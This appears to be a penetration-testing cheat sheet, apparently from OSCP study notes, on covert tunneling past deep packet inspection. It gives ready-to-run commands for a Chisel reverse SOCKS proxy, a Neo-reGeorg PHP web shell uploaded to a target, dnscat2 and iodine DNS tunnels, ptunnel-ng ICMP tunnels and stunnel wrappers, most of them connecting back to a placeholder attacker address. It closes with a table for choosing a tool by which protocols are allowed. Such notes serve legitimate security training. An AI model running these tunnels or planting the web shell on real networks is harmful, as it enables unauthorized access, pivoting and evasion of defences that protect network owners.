# Tunneling Through Deep Packet Inspection (DPI)

DPI-aware tunneling encodes traffic to evade inspection appliances.

## HTTP Tunneling (Chisel HTTP Mode)
```bash
chisel server -p 8080 --reverse --socks5
chisel client http://$ATTACK_IP:8080 R:1080:socks
```

## Neo-reGeorg (Web Shell Tunnel)
```bash
python3 neoreg.py generate -k password
# Upload tunnel.php to web server
python3 neoreg.py -k password -u http://$TARGET_IP/tunnel.php
# Now use socks5 127.0.0.1 1080
```

## DNS Tunneling
```bash
# dnscat2
# Server: sudo ruby dnscat2.rb --dns "domain=oscp.local,host=$ATTACK_IP" --no-cache
# Client: ./dnscat2-client $ATTACK_IP

# Iodine
# Server: sudo iodined -f -c -P secret 10.0.0.1 tunnel.oscp.local
# Client: sudo iodine -P secret $ATTACK_IP tunnel.oscp.local -r
```

## ICMP Tunneling (ptunnel-ng)
```bash
# Server (attacker): sudo ./ptunnel-ng -r $ATTACK_IP -R 127.0.0.1:22 -l 2222
# Client (target): sudo ./ptunnel-ng -p $ATTACK_IP -l 3333 -r $ATTACK_IP -R 22
# Then: ssh user@127.0.0.1 -p 3333
```

## HTTPS Wrapper (Stunnel)
```bash
# Server: stunnel -d 443 -r localhost:22
# Client: stunnel -c -d 443 -r $ATTACK_IP:443
# Then: ssh -D 1080 localhost
```

## Tool Decision
| Scenario | Tool | Why |
|---|---|---|
| HTTP(S) allowed | Chisel (HTTP mode) | Looks like HTTP |
| DNS only | dnscat2 | In DNS queries |
| ICMP only | ptunnel-ng | In ping packets |
| SSH blocked | SSH over 443 + sslh | Uses HTTPS port |
| Web root only | Neoreg | PHP/ASPX tunnel |
